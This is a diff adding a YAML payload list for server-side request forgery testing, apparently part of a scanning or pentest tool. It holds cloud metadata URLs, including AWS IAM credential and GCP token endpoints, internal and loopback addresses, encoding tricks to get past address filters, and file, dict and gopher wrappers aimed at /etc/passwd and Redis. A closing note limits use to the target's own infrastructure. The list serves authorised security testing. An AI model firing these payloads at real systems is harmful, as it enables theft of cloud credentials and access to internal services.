@@ -1,0 +1,43 @@
+name: SSRF Payloads
+description: SSRF payloads for cloud metadata, internal ranges, and protocol wrappers
+
+cloud_metadata:
+  aws:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    - "http://169.254.169.254/latest/api/token"
+  gcp:
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+  azure:
+    - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  digitalocean:
+    - "http://169.254.169.254/metadata/v1/"
+  alibaba:
+    - "http://100.100.100.200/latest/meta-data/"
+
+internal_ranges:
+  - "http://127.0.0.1/"
+  - "http://localhost/"
+  - "http://[::1]/"
+  - "http://0.0.0.0/"
+  - "http://192.168.1.1/"
+  - "http://10.0.0.1/"
+
+bypass_encodings:
+  - "http://127.1/"
+  - "http://0177.0.0.1/"
+  - "http://2130706433/"
+  - "http://127.0.0.1.nip.io/"
+  - "http://[::ffff:127.0.0.1]/"
+
+protocol_wrappers:
+  - "file:///etc/passwd"
+  - "dict://127.0.0.1:6379/info"
+  - "gopher://127.0.0.1:6379/_info"
+  - "ftp://127.0.0.1/"
+
+notes: >
+  Cloud metadata and internal-range payloads must only be sent against the
+  target's own infrastructure. Prefer interactsh callback URLs first to
+  confirm blind SSRF before escalating to metadata endpoints.
